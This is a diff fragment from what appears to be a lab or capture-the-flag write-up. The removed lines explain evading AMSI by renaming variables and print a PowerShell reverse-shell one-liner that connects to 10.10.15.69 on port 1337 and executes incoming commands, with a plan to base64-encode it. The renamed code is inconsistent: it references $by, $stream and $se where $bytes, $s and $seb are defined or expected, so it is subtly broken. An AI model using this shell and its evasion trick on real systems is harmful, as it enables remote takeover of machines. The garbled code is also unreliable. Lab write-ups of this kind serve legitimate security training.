@@ -161,12 +161,5 @@ I try running the payload above which is a powershell #3 (base64) encoded payloa
 
 Its possible that AMSI is preventing this
 
-After doing some research on this i find out the powershell #2 payload works if you change the variable names
 
-So ill try grabbing the payload then changing the names
-
-```python
-powershell -nop -c "$c = New-Object System.Net.Sockets.TCPClient('10.10.15.69',1337);$s = $c.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $s.Read($bytes, 0, $bytes.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($by,0, $i);$se = (iex $d 2>&1 | Out-String );$se2 = $se + 'PS ' + (pwd).Path + '> ';$seb = ([text.encoding]::ASCII).GetBytes($se2);$stream.Write($se,0,$se.Length);$stream.Flush()};$c.Close()"
-```
-Here is the updated version now ill add base64 encoding to it
 
